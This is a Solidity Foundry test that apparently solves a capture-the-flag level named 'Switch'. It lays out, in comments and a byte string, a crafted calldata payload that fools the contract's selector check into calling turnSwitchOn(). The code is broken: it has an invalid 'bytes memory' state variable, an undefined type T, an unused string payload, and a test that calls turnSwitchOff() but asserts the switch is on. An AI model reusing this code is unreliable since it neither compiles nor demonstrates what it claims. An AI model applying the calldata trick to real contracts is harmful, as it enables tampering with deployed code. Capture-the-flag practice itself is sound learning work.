// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {Switch} from "../src/L30/Switch.sol";

contract TestEvil_30 is Test {
    Switch t;
    T s;

    // we can trick the contract into thinking that the function selector is the one it expects

    // 00 0000000000000000000000000000000000000000000000000000000000000060
    // 20 0000000000000000000000000000000000000000000000000000000000000000
    // 40 20606e1500000000000000000000000000000000000000000000000000000000
    // 60 0000000000000000000000000000000000000000000000000000000000000004
    // 80 76227e1200000000000000000000000000000000000000000000000000000000


    bytes memory payload = '0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000';

    function setUp() public {
        s = new T();
        t = new Switch();
        console2.log(address(t));
        console2.log(address(s));
        // t = Switch(payable(0x2E2ee25fE88f4dFF3C2531cCB1B8d937CA78Cd6D));
    }

    // 0x20606e15 == turnSwitchOff()
    // 0x76227e12 == turnSwitchOn()

    function test_pwn() external {
        t.flipSwitch(
            abi.encodeWithSignature(
                "turnSwitchOff()"
                // ,
                // abi.encode("turnSwitchOn()")
            )
        );
        assert(t.switchOn() == true);
    }
}

